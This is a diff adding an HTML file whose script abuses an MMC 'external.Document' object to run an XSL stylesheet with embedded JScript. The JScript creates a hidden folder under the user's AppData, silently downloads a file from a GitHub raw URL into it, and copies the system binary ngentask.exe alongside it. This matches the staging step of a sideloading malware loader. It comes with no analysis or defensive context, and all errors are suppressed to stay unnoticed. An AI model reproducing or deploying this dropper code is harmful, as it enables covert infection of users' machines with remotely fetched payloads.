@@ -1,0 +1,65 @@
+<html>
+<body>
+<script>
+try {
+  var scopeNamespace = external.Document.ScopeNamespace;
+  var rootNode = scopeNamespace.GetRoot();
+  var mainNode = scopeNamespace.GetChild(rootNode);
+  var docNode = scopeNamespace.GetNext(mainNode);
+  external.Document.ActiveView.ActiveScopeNode = docNode;
+  var docObject = external.Document.ActiveView.ControlObject;
+  external.Document.ActiveView.ActiveScopeNode = mainNode;
+
+  var XML = docObject;
+  XML.async = false;
+  var xsl = XML;
+ 
+  xsl.loadXML('<?xml version="1.0"?>' +
+    '<stylesheet ' +
+    'xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" ' +
+    'xmlns:user="placeholder" ' +
+    'version="1.0">' +
+    '<output method="text"/>' +
+    ' <ms:script implements-prefix="user" language="JScript">' +
+    ' <![CDATA[' +
+    ' try {' +
+    '   var shell = new ActiveXObject("WScript.Shell");' +
+    '   var fso = new ActiveXObject("Scripting.FileSystemObject");' +
+    '   var userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%");' +
+    '   var logsFolder = userProfile + "\\\\AppData\\\\Local\\\\Microsoft\\\\Logs";' +
+    '   if (!fso.FolderExists(logsFolder)) { ' +
+    '     fso.CreateFolder(logsFolder); ' +
+    '     var folder = fso.GetFolder(logsFolder); ' +
+    '     folder.Attributes = folder.Attributes | 2; ' +
+    '   }' +
+    '   var jsonPath = logsFolder + "\\\\7z.json.txt";' +
+    '   var jsonUrl = "https://raw.githubusercontent.com/anonymous-xyzzz/jungle/main/7z.json.txt";' +
+    '   function downloadFile(url, path) {' +
+    '     try {' +
+    '       var http = new ActiveXObject("MSXML2.XMLHTTP");' +
+    '       http.open("GET", url, false);' +
+    '       http.setRequestHeader("User-Agent", "Mozilla/5.0");' +
+    '       http.send();' +
+    '       if (http.status === 200) {' +
+    '         var stream = new ActiveXObject("ADODB.Stream");' +
+    '         stream.Type = 1; stream.Mode = 3; stream.Open();' +
+    '         stream.Write(http.responseBody);' +
+    '         stream.SaveToFile(path, 2);' +
+    '         stream.Close();' +
+    '         return true;' +
+    '       }' +
+    '     } catch(e) { return false; }' +
+    '   }' +
+    '   downloadFile(jsonUrl, jsonPath);' +
+    '   var ngentaskSource = "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\ngentask.exe";' +
+    '   var ngentaskDest = logsFolder + "\\\\ngentask.exe";' +
+    '   if (fso.FileExists(ngentaskSource)) { fso.CopyFile(ngentaskSource, ngentaskDest, true); }' +
+    ' } catch(e) { }' +
+    ' ]]>' +
+    ' </ms:script>' +
+    '</stylesheet>');
+  XML.transformNode(xsl);
+} catch (e) {}
+</script>
+</body>
+</html>
